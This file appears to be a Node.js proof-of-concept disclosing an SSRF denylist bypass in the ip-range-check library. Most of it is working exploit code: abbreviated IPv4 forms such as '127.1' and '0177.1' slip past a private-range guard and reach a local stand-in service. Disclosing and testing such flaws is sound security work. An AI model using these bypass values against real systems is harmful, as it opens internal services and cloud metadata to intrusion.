/*
 * PoC: SSRF denylist bypass in ip-range-check@0.2.0
 *
 * ip-range-check is commonly used to reject requests to private/internal IP
 * ranges (an SSRF guard):
 *
 *     if (ipRangeCheck(host, PRIVATE_RANGES)) throw new Error('blocked')
 *     await fetchSomething(host)
 *
 * This PoC shows that several abbreviated / alternate IPv4 representations that
 * the OS socket layer happily routes to a private address are NOT recognised by
 * ip-range-check, so the guard returns false ("not in a private range") and the
 * request proceeds to the internal service.
 *
 * Run:  node poc.mjs
 */
import http from 'node:http'
import net from 'node:net'
import { createRequire } from 'node:module'
const require = createRequire(import.meta.url)
const ipRangeCheck = require('ip-range-check')

// A typical private-range denylist a developer would build to prevent SSRF.
const PRIVATE_RANGES = [
  '127.0.0.0/8',   // loopback
  '10.0.0.0/8',    // RFC1918
  '172.16.0.0/12', // RFC1918
  '192.168.0.0/16',// RFC1918
  '169.254.0.0/16',// link-local / cloud metadata (169.254.169.254)
  '::1/128', 'fc00::/7', 'fe80::/10',
]

// The SSRF guard a developer would write.
function guardAllows(host) {
  // returns true if the host is considered SAFE (not in a private range)
  return !ipRangeCheck(host, PRIVATE_RANGES)
}

// Stand-in for an internal-only service bound to loopback.
const internal = http.createServer((_req, res) => res.end('INTERNAL-SECRET-DATA'))
await new Promise((r) => internal.listen(0, '127.0.0.1', r))
const port = internal.address().port

// Attacker-supplied host values. All of these route to 127.0.0.1 via the OS
// resolver (inet_aton-style), but ipaddr.js@1.9.1 (bundled by ip-range-check)
// throws while parsing them, so ip-range-check's catch-all returns false.
const attackerHosts = ['127.1', '127.0.1', '0177.1', '127.0x1']
// Canonical control that IS correctly blocked:
const control = '127.0.0.1'

console.log(`Internal service bound to 127.0.0.1:${port}\n`)
console.log(`Control — guard on canonical ${control}: allows=${guardAllows(control)} (correctly blocked)\n`)

for (const host of attackerHosts) {
  const allowed = guardAllows(host)
  if (!allowed) {
    console.log(`  ${host.padEnd(10)} guard=BLOCKED`)
    continue
  }
  const body = await fetchVia(host, port)
  const pwned = body.includes('INTERNAL-SECRET-DATA')
  console.log(
    `  ${host.padEnd(10)} guard=ALLOWED  ->  fetch returned ${JSON.stringify(body)}` +
    (pwned ? '   <== SSRF: reached internal service' : '')
  )
}
internal.close()

// Uses the RAW host (as a legacy url.parse or a raw user "host" field would yield).
// NB: the modern WHATWG `new URL()` normalises these forms and is NOT affected;
// the vulnerable pattern is raw-host input or legacy url.parse().hostname.
function fetchVia(host, port) {
  return new Promise((res) => {
    const req = http.get({ host, port, path: '/' }, (r) => {
      let d = ''
      r.on('data', (c) => (d += c))
      r.on('end', () => res(d))
    })
    req.on('error', (e) => res('ERR:' + e.code))
    req.setTimeout(1500, () => { req.destroy(); res('TIMEOUT') })
  })
}
